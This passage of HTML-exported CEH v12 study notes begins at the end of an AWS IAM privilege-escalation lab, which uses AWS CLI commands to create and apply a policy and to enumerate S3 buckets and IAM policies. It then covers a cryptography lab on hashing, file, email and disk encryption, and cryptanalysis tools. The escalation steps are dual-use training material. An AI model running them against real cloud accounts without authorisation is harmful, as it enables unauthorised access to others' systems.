</p></li></ul><ul id="138bdadd-c4a7-8023-948d-c9b2e7153f05" class="bulleted-list"><li style="list-style-type:disc">Apply the policy<ul id="138bdadd-c4a7-80a3-a1d3-fc26983a72f1" class="bulleted-list"><li style="list-style-type:circle">Type <code>aws iam create-policy --policy-name user-policy --policy-document file://user-policy.json</code></li></ul></li></ul><ul id="138bdadd-c4a7-80f1-bdee-ffe29fe7a0e6" class="bulleted-list"><li style="list-style-type:disc">Attach the policy to the user account<ul id="138bdadd-c4a7-80f3-a2a8-caa7ca741570" class="bulleted-list"><li style="list-style-type:circle">Type <code><strong>aws iam list-attached-user-policies --user-name [Target Username]</strong></code></li></ul></li></ul><ul id="138bdadd-c4a7-80cb-8701-ca98faa8c1b1" class="bulleted-list"><li style="list-style-type:disc">Verify it has been applied<ul id="138bdadd-c4a7-80e9-ad73-d91dcaabe73f" class="bulleted-list"><li style="list-style-type:circle"><code><strong>aws iam list-users</strong></code></li></ul></li></ul></details></li></ul><ul id="138bdadd-c4a7-80e7-aa8e-e94af85896f4" class="toggle"><li><details open=""><summary>Obtain info about the AWS environment (irrelevant to privesc)</summary><ul id="138bdadd-c4a7-80ba-b2f6-fc5650ddca21" class="bulleted-list"><li style="list-style-type:disc">List of S3 buckets: <strong>aws s3api list-buckets --query &quot;Buckets[].Name&quot;</strong></li></ul><ul id="138bdadd-c4a7-80ec-870a-fa9e40facf3b" class="bulleted-list"><li style="list-style-type:disc">User Policies: <strong>aws iam list-user-policies</strong></li></ul><ul id="138bdadd-c4a7-80f5-8e8a-f3bcffadc482" class="bulleted-list"><li style="list-style-type:disc">Role Policies: <strong>aws iam list-role-policies</strong></li></ul><ul id="138bdadd-c4a7-80f0-86d6-f22d5acb74e7" class="bulleted-list"><li style="list-style-type:disc">Group policies: <strong>aws iam list-group-policies</strong></li></ul><ul id="138bdadd-c4a7-80fb-9330-d3f92baecec7" class="bulleted-list"><li style="list-style-type:disc">Create user: <strong>aws iam create-user</strong></li></ul></details></li></ul></details></li></ul></details></li></ul><ul id="138bdadd-c4a7-80cb-b5a0-dc62cd4f6a45" class="toggle"><li><details open=""><summary>Lab 19 - Cryptography</summary><ul id="138bdadd-c4a7-80f8-8611-f11228e3f253" class="toggle"><li><details open=""><summary>Encrypt information using tools</summary><ul id="138bdadd-c4a7-80fe-a2d0-f4cfd078c347" class="toggle"><li><details open=""><summary>Calculate one-way hashes using HashCalc</summary><ul id="13bbdadd-c4a7-807d-a884-c5e09a93873c" class="bulleted-list"><li style="list-style-type:disc">Download <a href="https://github.com/ljalil/HashCalc">https://github.com/ljalil/HashCalc</a></li></ul><ul id="13bbdadd-c4a7-8057-9853-d330e97a1cb4" class="bulleted-list"><li style="list-style-type:disc">Hash files</li></ul></details></li></ul><ul id="138bdadd-c4a7-8009-b578-e4a6ed576ede" class="toggle"><li><details open=""><summary>Calculate MD5 hashes using MD5 Calculator</summary><ul id="13bbdadd-c4a7-80f2-b46b-c64055f92ce8" class="bulleted-list"><li style="list-style-type:disc">Download <a href="http://www.md5calculator.com/">http://www.md5calculator.com/</a></li></ul><ul id="13bbdadd-c4a7-80f4-8af0-f89e7bef5427" class="bulleted-list"><li style="list-style-type:disc">Load files and calculate their hashes</li></ul><ul id="13bbdadd-c4a7-801a-a9a7-e9e6cad6cdbf" class="bulleted-list"><li style="list-style-type:disc">Auto compare hashes</li></ul></details></li></ul><ul id="138bdadd-c4a7-80ad-ba2a-c0af2538a28a" class="toggle"><li><details open=""><summary>Calculate MD5 and SHA1 hashes using HashMyFiles</summary><ul id="13bbdadd-c4a7-8035-adee-c8fbed358c24" class="bulleted-list"><li style="list-style-type:disc">Can auto calculate hashes for multiple files, can even select a folder</li></ul><ul id="13bbdadd-c4a7-80ae-bc5a-fcd452d636b4" class="bulleted-list"><li style="list-style-type:disc">Can copy list of hashes</li></ul><ul id="13bbdadd-c4a7-8095-bc65-e7d32c836ad8" class="bulleted-list"><li style="list-style-type:disc">Can also do <strong>MD5, SHA1, CRC32, SHA-256, SHA-512</strong>, and <strong>SHA-384</strong><ul id="13bbdadd-c4a7-80ca-b549-dedd6f0c24ec" class="bulleted-list"><li style="list-style-type:circle">To enable them go to <code>Options → Hash Types</code></li></ul></li></ul><ul id="13bbdadd-c4a7-80e6-bbdd-da83cf1c6abb" class="bulleted-list"><li style="list-style-type:disc">Run <code><strong>E:\CEH-Tools\CEHv12 Module 20 Cryptography\MD5 and MD6 Hash Calculators\HashMyFiles\HashMyFiles.exe</strong></code></li></ul></details></li></ul><ul id="138bdadd-c4a7-8076-83b0-d8de677c50a9" class="toggle"><li><details open=""><summary>Perform file and text message encryption using CryptoForge</summary><ul id="13bbdadd-c4a7-80cb-801b-f4175bb7e6f0" class="bulleted-list"><li style="list-style-type:disc">Install <code><strong>E:\CEH-Tools\CEHv12 Module 20 Cryptography\Cryptography Tools\CryptoForge</strong></code></li></ul><ul id="13bbdadd-c4a7-8002-af0d-e92ce405990c" class="bulleted-list"><li style="list-style-type:disc">Encrypt file<ul id="13bbdadd-c4a7-806d-a2fc-fbb4857f269c" class="bulleted-list"><li style="list-style-type:circle">Right click on file and <code>Encrypt</code></li></ul><ul id="13bbdadd-c4a7-800f-a725-e5926b9856af" class="bulleted-list"><li style="list-style-type:circle">Set a password</li></ul><ul id="13bbdadd-c4a7-80dc-be28-df9cd37a89fa" class="bulleted-list"><li style="list-style-type:circle">The file will automatically decrypt on this system but other systems will need this tool and the password</li></ul></li></ul><ul id="13bbdadd-c4a7-8050-b19d-d14fdac8be28" class="bulleted-list"><li style="list-style-type:disc">Encrypt text<ul id="13bbdadd-c4a7-8022-a55e-c6101ec17dd2" class="bulleted-list"><li style="list-style-type:circle">Open <code>CryptoForge Text</code></li></ul><ul id="13bbdadd-c4a7-8068-b5c0-f83be2b8a3a0" class="bulleted-list"><li style="list-style-type:circle">Write some text and click encrypt</li></ul><ul id="13bbdadd-c4a7-805d-a8c5-f8b2afb2de39" class="bulleted-list"><li style="list-style-type:circle">Set a password</li></ul><ul id="13bbdadd-c4a7-802c-9a58-f6df0744dc50" class="bulleted-list"><li style="list-style-type:circle">Save file</li></ul><ul id="13bbdadd-c4a7-80f8-958d-f9a16fb3b09c" class="bulleted-list"><li style="list-style-type:circle">Open file click decrypt, use password</li></ul></li></ul></details></li></ul><ul id="138bdadd-c4a7-80db-9a82-d335ea568ff1" class="toggle"><li><details open=""><summary>Encrypt and decrypt data using BCTextEncoder</summary><ul id="13bbdadd-c4a7-80e9-ae6d-ca53746cd0e3" class="bulleted-list"><li style="list-style-type:disc">Uses AES256</li></ul><ul id="13bbdadd-c4a7-80bd-b93d-de35c5b8b42f" class="bulleted-list"><li style="list-style-type:disc">Run <code><strong>E:\CEH-Tools\CEHv12 Module 20 Cryptography\Cryptography Tools\BCTextEncoder\BCTextEncoder.exe</strong></code></li></ul><ul id="13bbdadd-c4a7-805d-9597-d86f2b767a1b" class="bulleted-list"><li style="list-style-type:disc">Write some text, click encode, type password</li></ul><ul id="13bbdadd-c4a7-80b7-b720-ec7e4a9cca96" class="bulleted-list"><li style="list-style-type:disc">Encrypted data will be shown below</li></ul><ul id="13bbdadd-c4a7-8057-9e2b-f22a080cd372" class="bulleted-list"><li style="list-style-type:disc">Paste encrypted data below, click decode, type password, voila</li></ul></details></li></ul><ul id="13bbdadd-c4a7-803f-bc52-fb715b5b8b0e" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="13bbdadd-c4a7-8071-a93f-d8c91d5841fe" class="bulleted-list"><li style="list-style-type:disc"><strong>AxCrypt</strong> (axcrypt.net)</li></ul><ul id="13bbdadd-c4a7-8031-a6fc-e3ec96a37052" class="bulleted-list"><li style="list-style-type:disc"><strong>Microsoft Cryptography Tools</strong> (docs.microsoft.com)</li></ul><ul id="13bbdadd-c4a7-80ac-a12c-ffde04fa6566" class="bulleted-list"><li style="list-style-type:disc"><strong>Concealer</strong> (belightsoft.com)<br/><br/><br/></li></ul></details></li></ul></details></li></ul><ul id="138bdadd-c4a7-80aa-92e7-c13117f3caa1" class="toggle"><li><details open=""><summary>Create a self-signed certificate</summary><ul id="13bbdadd-c4a7-80dc-ba78-db83e679d155" class="bulleted-list"><li style="list-style-type:disc">Open an IIS Server</li></ul><ul id="13bbdadd-c4a7-80cd-ab70-dc636e12b0b6" class="bulleted-list"><li style="list-style-type:disc">Start <code>IIS Manager</code></li></ul><ul id="13bbdadd-c4a7-80dc-8391-dcb7a8a21c37" class="bulleted-list"><li style="list-style-type:disc">Click on the Server → Certificates</li></ul><ul id="13bbdadd-c4a7-8060-ac52-c1a78c7d640b" class="bulleted-list"><li style="list-style-type:disc">Actions → Create Self Signed Certificate</li></ul><ul id="13bbdadd-c4a7-8044-99f8-df61d1317702" class="bulleted-list"><li style="list-style-type:disc">Set a name, click OK</li></ul><ul id="13bbdadd-c4a7-8050-a7cf-e930a04c5b3c" class="bulleted-list"><li style="list-style-type:disc">Under Sites → Select the site → Click Bindings (under Actions)</li></ul><ul id="13bbdadd-c4a7-809e-bd1d-dd08e8c1941a" class="bulleted-list"><li style="list-style-type:disc">Click Add → https, site, certificate → OK</li></ul><ul id="13bbdadd-c4a7-803c-be5a-eec0e46477d1" class="bulleted-list"><li style="list-style-type:disc">Close</li></ul></details></li></ul><ul id="138bdadd-c4a7-80ce-a3f4-e7d0b5c92030" class="toggle"><li><details open=""><summary>Perform email encryption using RMail</summary><ul id="13cbdadd-c4a7-8053-a19d-d2492078b37f" class="bulleted-list"><li style="list-style-type:disc">Go to <code>rmail.com/apps</code></li></ul><ul id="13cbdadd-c4a7-80bd-a18f-fb23fce4b013" class="bulleted-list"><li style="list-style-type:disc">Select <code>RMail Online</code></li></ul><ul id="13cbdadd-c4a7-80d3-90a2-efc3ecb1d1f3" class="bulleted-list"><li style="list-style-type:disc">Click <code>Click Here to Get Started</code></li></ul><ul id="13cbdadd-c4a7-80ef-a865-c1715a02fa04" class="bulleted-list"><li style="list-style-type:disc">Create an account</li></ul><ul id="13cbdadd-c4a7-8027-a9fc-df379761f229" class="toggle"><li><details open=""><summary>Send an email</summary><ul id="13cbdadd-c4a7-8085-8a9e-fb030ee4e574" class="bulleted-list"><li style="list-style-type:disc">Click <code>Marked as</code></li></ul><ul id="13cbdadd-c4a7-80e3-a2ae-e18a1236ddf5" class="bulleted-list"><li style="list-style-type:disc">Click <code>Encrypt</code></li></ul><ul id="13cbdadd-c4a7-80ff-ba2d-d69eabe865f9" class="bulleted-list"><li style="list-style-type:disc">Click <code>Transmission</code></li></ul><ul id="13cbdadd-c4a7-807b-b56a-d7365204cea2" class="bulleted-list"><li style="list-style-type:disc">Click <code>E-Sign</code></li></ul><ul id="13cbdadd-c4a7-8055-8ec4-e911c3e341bc" class="bulleted-list"><li style="list-style-type:disc">Click <code>Web sign</code></li></ul><ul id="13cbdadd-c4a7-80e8-94b4-d884fc428932" class="bulleted-list"><li style="list-style-type:disc">Click <code>Send</code></li></ul><p id="13cbdadd-c4a7-80f2-894b-f06c2723fbb6" class="">
</p></details></li></ul><ul id="13cbdadd-c4a7-809c-ab42-fa5b54c38f0a" class="bulleted-list"><li style="list-style-type:disc">The receiver will have to open a web portal, view and sign the document</li></ul><ul id="13cbdadd-c4a7-801b-a3ea-f3aea8429791" class="bulleted-list"><li style="list-style-type:disc">We will receive emails of confirmation</li></ul><ul id="13cbdadd-c4a7-8062-8466-eff669eeff2b" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="13cbdadd-c4a7-8090-b9c0-fa4235a21f93" class="bulleted-list"><li style="list-style-type:disc"><strong>Virtru</strong> (virtru.com)</li></ul><ul id="13cbdadd-c4a7-8095-8af7-f6d0094d4fd5" class="bulleted-list"><li style="list-style-type:disc"><strong>ZixMail</strong> (zixcorp.com)</li></ul><ul id="13cbdadd-c4a7-8054-89fc-f1506c4456ff" class="bulleted-list"><li style="list-style-type:disc"><strong>Egress Secure Email and File Transfer</strong> (egress.com)</li></ul><ul id="13cbdadd-c4a7-8044-856e-cf2e15dc9d03" class="bulleted-list"><li style="list-style-type:disc"><strong>Proofpoint Email Protection</strong> (proofpoint.com)<br/><br/></li></ul></details></li></ul></details></li></ul><ul id="138bdadd-c4a7-8064-a570-c6178f0ae024" class="toggle"><li><details open=""><summary>Perform disk encryption</summary><ul id="138bdadd-c4a7-80f8-a09a-d325b2d4c9d2" class="toggle"><li><details open=""><summary>Using VeraCrypt</summary><p id="13cbdadd-c4a7-80d4-9aa7-fd802d3664e4" class="">We will create a volume, set password, mount it, input files and dismount</p><ul id="13cbdadd-c4a7-8011-9bf4-cf913d4e3182" class="bulleted-list"><li style="list-style-type:disc">Download <a href="https://www.veracrypt.fr/code/VeraCrypt/">https://www.veracrypt.fr/code/VeraCrypt/</a></li></ul><ul id="13cbdadd-c4a7-8004-8848-e74d93059c15" class="toggle"><li><details open=""><summary>Create a volume</summary><ul id="13cbdadd-c4a7-8022-9fda-e149959cfc76" class="bulleted-list"><li style="list-style-type:disc">Click <code>Create Volume</code> → <code>Create an encrypted file container</code> → <code>Next</code> → <code>Next</code></li></ul><ul id="13cbdadd-c4a7-8064-8378-fb9bd87577e4" class="bulleted-list"><li style="list-style-type:disc"><code>Select file</code> (Volume location)<ul id="13cbdadd-c4a7-80dd-8e77-c2f54e965401" class="bulleted-list"><li style="list-style-type:circle">Creates the volume file</li></ul></li></ul><ul id="13cbdadd-c4a7-80ec-bda2-d924ee150736" class="bulleted-list"><li style="list-style-type:disc">Set the <code>volume size</code></li></ul><ul id="13cbdadd-c4a7-80f1-b28a-e0ee2abf50f0" class="bulleted-list"><li style="list-style-type:disc">Set volume <code>password</code></li></ul><ul id="13cbdadd-c4a7-8021-a62d-c108e769cbbf" class="bulleted-list"><li style="list-style-type:disc">Tick the checkbox and make random mouse movements to generate a randomized key</li></ul><ul id="13cbdadd-c4a7-8046-b659-fdd2a7b13e84" class="bulleted-list"><li style="list-style-type:disc">Click <code>Format</code></li></ul></details></li></ul><ul id="13cbdadd-c4a7-8085-9d0e-e655ba72de64" class="toggle"><li><details open=""><summary>Mount a volume</summary><ul id="13cbdadd-c4a7-8029-b304-feaddf3d4eb2" class="bulleted-list"><li style="list-style-type:disc">Click a drive letter</li></ul><ul id="13cbdadd-c4a7-80b5-b2b7-fd9a5799c8ed" class="bulleted-list"><li style="list-style-type:disc">Click <code>Select file</code></li></ul><ul id="13cbdadd-c4a7-80b3-b13c-fb76d0906e1e" class="bulleted-list"><li style="list-style-type:disc">Select the file volume you want to mount</li></ul><ul id="13cbdadd-c4a7-8044-a4bf-e394884d6ef5" class="bulleted-list"><li style="list-style-type:disc">Click <code>Mount</code></li></ul><ul id="13cbdadd-c4a7-80b5-bd84-d899f536b60b" class="bulleted-list"><li style="list-style-type:disc">Type the <code>password</code></li></ul><ul id="13cbdadd-c4a7-80f1-84cf-f0659f20409e" class="bulleted-list"><li style="list-style-type:disc">Use the volume normally, create or delete files</li></ul><ul id="13cbdadd-c4a7-805e-826e-df66b5e20aa7" class="bulleted-list"><li style="list-style-type:disc">Press <code>dismount</code> to exit the volume, changes are saved automatically</li></ul></details></li></ul></details></li></ul><ul id="138bdadd-c4a7-800a-a973-e45c2925ce5a" class="toggle"><li><details open=""><summary>Using BitLocker Drive Encryption</summary><ul id="13cbdadd-c4a7-80a3-a4c6-edf189940df4" class="bulleted-list"><li style="list-style-type:disc">Start <code>Manage BitLocker</code></li></ul><ul id="13cbdadd-c4a7-8058-9281-e87a6fe7ea18" class="bulleted-list"><li style="list-style-type:disc">Click <code>Turn on BitLocker</code> on selected drive</li></ul><ul id="13cbdadd-c4a7-80a1-846c-c8f87ab8e18a" class="bulleted-list"><li style="list-style-type:disc">Set a <code>password</code></li></ul><ul id="13cbdadd-c4a7-80f8-817b-f157eadf624f" class="bulleted-list"><li style="list-style-type:disc">Save the recovery to file</li></ul><ul id="13cbdadd-c4a7-80b5-a014-e5720a3b38b7" class="bulleted-list"><li style="list-style-type:disc"><code>Encrypt entire drive</code></li></ul><ul id="13cbdadd-c4a7-800e-aa6e-ce7c6dda41b0" class="bulleted-list"><li style="list-style-type:disc"><code>Compatible mode</code></li></ul><ul id="13cbdadd-c4a7-80c7-8ff4-e6715dafb52c" class="bulleted-list"><li style="list-style-type:disc"><code>Start encrypting</code></li></ul><ul id="13cbdadd-c4a7-8061-9a85-daeb03096131" class="bulleted-list"><li style="list-style-type:disc">When you restart and try to open drive, you will need to enter a password to unlock</li></ul></details></li></ul><ul id="138bdadd-c4a7-8016-ab2d-c074a546e748" class="toggle"><li><details open=""><summary>Using Rohos Disk Encryption</summary><p id="13cbdadd-c4a7-8008-919d-e805388668fb" class="">Rohos Disk Encryption creates hidden and password-protected partitions on a computer or USB flash drive, and password protects/locks access to your Internet applications. It uses a NIST-approved AES encryption algorithm with a 256-bit encryption key length. Encryption is automatic and on-the-fly.</p><ul id="13cbdadd-c4a7-8064-bc88-fb7843629a42" class="bulleted-list"><li style="list-style-type:disc">Install <code><strong>E:\CEH-Tools\CEHv12 Module 20 Cryptography\Disk Encryption Tools\Rohos Disk Encryption\rohos.exe</strong></code></li></ul><ul id="13cbdadd-c4a7-8012-a913-e2f04e6b6721" class="bulleted-list"><li style="list-style-type:disc">Click <code>Create new disk...</code></li></ul><ul id="13cbdadd-c4a7-80d2-a6db-c8f7f769073e" class="bulleted-list"><li style="list-style-type:disc">Click <code>[Change...]</code> and set disk size and encryption</li></ul><ul id="13cbdadd-c4a7-80dd-a52d-db5ffb1bd133" class="bulleted-list"><li style="list-style-type:disc">Set <code>password</code></li></ul><ul id="13cbdadd-c4a7-804f-a04f-fd33e49230c9" class="bulleted-list"><li style="list-style-type:disc">Click <code>Create disk</code></li></ul><ul id="13cbdadd-c4a7-8054-9c49-ebe628ed181b" class="bulleted-list"><li style="list-style-type:disc">A window appears with the disk contents</li></ul><ul id="13cbdadd-c4a7-8054-b9dc-ce4081a2d176" class="bulleted-list"><li style="list-style-type:disc">You can click <code>Disconnect</code> or <code>Browse</code> anytime</li></ul></details></li></ul><ul id="13cbdadd-c4a7-8079-b3ac-fc8472bc6260" class="toggle"><li><details open=""><summary>Other Tools</summary><ul id="13cbdadd-c4a7-8097-a4f0-f18125b823b6" class="bulleted-list"><li style="list-style-type:disc"><strong>FinalCrypt</strong> (finalcrypt.org)</li></ul><ul id="13cbdadd-c4a7-8076-ac7c-c30ef324bd1e" class="bulleted-list"><li style="list-style-type:disc"><strong>Seqrite Encryption Manager</strong> (seqrite.com)</li></ul><ul id="13cbdadd-c4a7-8073-bc62-fe5e1cb652d6" class="bulleted-list"><li style="list-style-type:disc"><strong>FileVault</strong> (support.apple.com)</li></ul><ul id="13cbdadd-c4a7-8036-bf39-f2520e61e0a1" class="bulleted-list"><li style="list-style-type:disc"><strong>Gillsoft Full Disk</strong> <strong>Encryption</strong> (gilisoft.com)<br/><br/><br/></li></ul></details></li></ul></details></li></ul><ul id="138bdadd-c4a7-80d1-ad21-df976f1fcee8" class="toggle"><li><details open=""><summary>Perform cryptanalysis using tools</summary><p id="13cbdadd-c4a7-8013-9d64-e97f7e29e6dd" class="">In this lab, you will learn how to compromise cryptographic systems using various cryptanalysis techniques and tools that help in breaching cryptographic security.</p><ul id="138bdadd-c4a7-807e-a86b-f2e302c3a15b" class="toggle"><li><details open=""><summary>Using CrypTool</summary><p id="13cbdadd-c4a7-80e2-b4b3-c7ba468e676e" class="">CrypTool allows to apply cryptographic algorithms to encrypt and decrypt text</p><ul id="13cbdadd-c4a7-8005-a114-d49293f26d55" class="bulleted-list"><li style="list-style-type:disc">Install <a href="https://www.cryptool.org/en/">https://www.cryptool.org/en/</a></li></ul><ul id="13cbdadd-c4a7-80af-8542-ceeede355c22" class="bulleted-list"><li style="list-style-type:disc">Close the opened file, and open a new blank one</li></ul><ul id="13cbdadd-c4a7-8000-b5c1-c73d75b0a0a8" class="bulleted-list"><li style="list-style-type:disc">Write some text</li></ul><ul id="13cbdadd-c4a7-807d-a762-cd8242a94c93" class="bulleted-list"><li style="list-style-type:disc">Go to <code>Encrypt/Decrypt</code> → <code>Symmetric</code> → Select an algorithm</li></ul><ul id="13cbdadd-c4a7-802e-bf51-de1e387c5cba" class="bulleted-list"><li style="list-style-type:disc">Set the key length, then set the desired key</li></ul><ul id="13cbdadd-c4a7-80c0-a0cf-d9a8081f9a12" class="bulleted-list"><li style="list-style-type:disc">Click <code>Encrypt</code> and the encrypted file will be loaded</li></ul><ul id="13cbdadd-c4a7-8073-95d5-f1d674da497b" class="bulleted-list"><li style="list-style-type:disc">You can save this file and load it here, then do the same process and click <code>Decrypt</code> to decrypt it</li></ul></details></li></ul><ul id="138bdadd-c4a7-80f7-9af5-dd0f2029d510" class="toggle"><li><details open=""><summary>Using AlphaPeeler</summary><p id="13cbdadd-c4a7-806c-b9c5-c060b1d293fc" class="">Encrypts and decrypts files</p><ul id="13cbdadd-c4a7-8036-a138-f49ef3431900" class="bulleted-list"><li style="list-style-type:disc">Install <a href="https://sourceforge.net/projects/alphapeeler/">https://sourceforge.net/projects/alphapeeler/</a></li></ul><ul id="13cbdadd-c4a7-80ca-a508-d5f718d47ece" class="bulleted-list"><li style="list-style-type:disc">Encrypt<ul id="13cbdadd-c4a7-8041-a3ae-ca84d9cd7202" class="bulleted-list"><li style="list-style-type:circle">Create a new file and add text in desktop</li></ul><ul id="13cbdadd-c4a7-80b5-8e85-cae54a35d33a" class="bulleted-list"><li style="list-style-type:circle">Click <code>Professional Crypto</code> → <code>DES Crypto</code></li></ul><ul id="13cbdadd-c4a7-80cb-9cc3-d424219867b2" class="bulleted-list"><li style="list-style-type:circle">Load the Plain text file and set a Crypto file</li></ul><ul id="13cbdadd-c4a7-80f5-8954-d0364e750dd3" class="bulleted-list"><li style="list-style-type:circle">Set a <code>Pass phrase</code></li></ul><ul id="13cbdadd-c4a7-80da-9435-c05591e9edf4" class="bulleted-list"><li style="list-style-type:circle">Click <code>Encrypt DES</code></li></ul></li></ul><ul id="13cbdadd-c4a7-80d4-ae1a-e594f1cff815" class="bulleted-list"><li style="list-style-type:disc">Open a file<ul id="13cbdadd-c4a7-80ef-8c19-e127d338715c" class="bulleted-list"><li style="list-style-type:circle">Click <code>Professional Crypto</code> → <code>DES Crypto</code></li></ul><ul id="13cbdadd-c4a7-80a3-982e-fbe62f66f7d2" class="bulleted-list"><li style="list-style-type:circle">Set the new Plain text file and load a Crypto file</li></ul><ul id="13cbdadd-c4a7-8071-88d0-d5c312d37ff2" class="bulleted-list"><li style="list-style-type:circle">Set a <code>Pass phrase</code></li></ul><ul id="13cbdadd-c4a7-803d-947d-d5fd4514a614" class="bulleted-list"><li style="list-style-type:circle">Click <code>Decrypt DES-EDE (CBC)</code></li></ul></li></ul></details></li></ul></details></li></ul></details></li></ul><p id="12abdadd-c4a7-8057-9406-d436fe0f84c0" class="">
</p></div></details><p id="111bdadd-c4a7-80a1-b1d9-f0595a63a78a" class="">
</p><p id="170245fd-d4ce-4f93-b6ea-45908ac60ab4" class="">
</p><p id="43ec0bc6-e742-4727-a240-46510888091c" class="">
</p><p id="65165476-525c-4622-9358-c0e9ec908a72" class="">
</p><p id="2e13bf27-f968-46db-8f0c-1c959627241d" class="">
</p><p id="16341142-a704-4085-9ad7-56090f9ef12a" class="">
</p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>